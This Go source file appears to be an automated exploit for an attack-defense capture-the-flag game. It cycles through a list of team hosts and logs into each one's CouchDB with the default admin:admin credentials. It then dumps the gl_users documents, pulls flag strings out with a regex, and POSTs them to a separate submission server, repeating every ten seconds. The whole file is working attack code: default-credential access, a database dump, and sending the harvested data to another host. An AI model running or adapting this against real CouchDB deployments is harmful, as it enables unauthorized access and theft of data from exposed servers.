package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"regexp"
	"time"
)

const url = "http://admin:admin@%s:5984/gl_users/_all_docs"

var ips = []string{
	"10.40.1.10",
	"10.40.2.10",
	"10.40.3.10",
	"10.40.4.10",
	"10.40.5.10",
	"10.40.6.10",
	"10.40.7.10",
	"10.40.8.10",
	"10.40.9.10",
}

type Data struct {
	Total  int   `json:"total_rows"`
	Offset int   `json:"offset"`
	Rows   []Row `json:"rows"`
}

type Row struct {
	Id  string `json:"id"`
	Key string `json:"key"`
}

type Flags struct {
	Values []string `json:"flags"`
}

var rule = regexp.MustCompile("(?i)ALT_[a-f0-9]{26}")

func main() {
	used := map[string]struct{}{}
	for {
		for _, ip := range ips {
			log.Println("Started: ", ip)
			client := http.Client{}

			req, err := http.NewRequest("GET", fmt.Sprintf(url, ip), bytes.NewBuffer([]byte{}))
			if err != nil {
				log.Printf("[%s] -> %e", ip, err)
				continue
			}
			ctx, cancel := context.WithTimeout(context.Background(), time.Millisecond*300)

			req = req.WithContext(ctx)
			resp, err := client.Do(req)
			if err != nil {
				log.Printf("[%s] Get req -> %e", ip, err)
				continue
			}
			var data Data
			err = json.NewDecoder(resp.Body).Decode(&data)
			if err != nil {
				log.Printf("[%s] Resp decode -> %e", ip, err)
				continue
			}
			fls := Flags{Values: []string{}}
			for _, row := range data.Rows {
				if rule.MatchString(row.Key) {
					flag := rule.FindStringSubmatch(row.Key)[0]
					tmp := fmt.Sprintf("%s:%s", ip, flag)
					if _, ok := used[tmp]; ok {
						continue
					}
					used[tmp] = struct{}{}
					flag = "ALT_" + flag[4:]
					fls.Values = append(fls.Values, flag)
				}
			}
			if len(fls.Values) <= 0 {
				continue
			}
			log.Printf("[%s] Flags: %v", ip, fls.Values)
			flsJson, _ := json.Marshal(fls)
			req, err = http.NewRequest("POST", "http://10.80.80.10/api/v1/flags", bytes.NewBuffer(flsJson))
			if err != nil {
				log.Printf("[%s] -> %e", ip, err)
				continue
			}

			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("Accept", "application/json")
			resp2, err := client.Do(req)
			if err != nil {
				log.Printf("[%s] -> %e", ip, err)
				continue
			}
			respBody, err := io.ReadAll(resp2.Body)
			if err != nil {
				log.Printf("[%s] -> %e", ip, err)
				continue
			}
			log.Printf("[%s] Sended: %s", ip, string(respBody))
			cancel()
		}
		time.Sleep(time.Second * 10)
	}
}
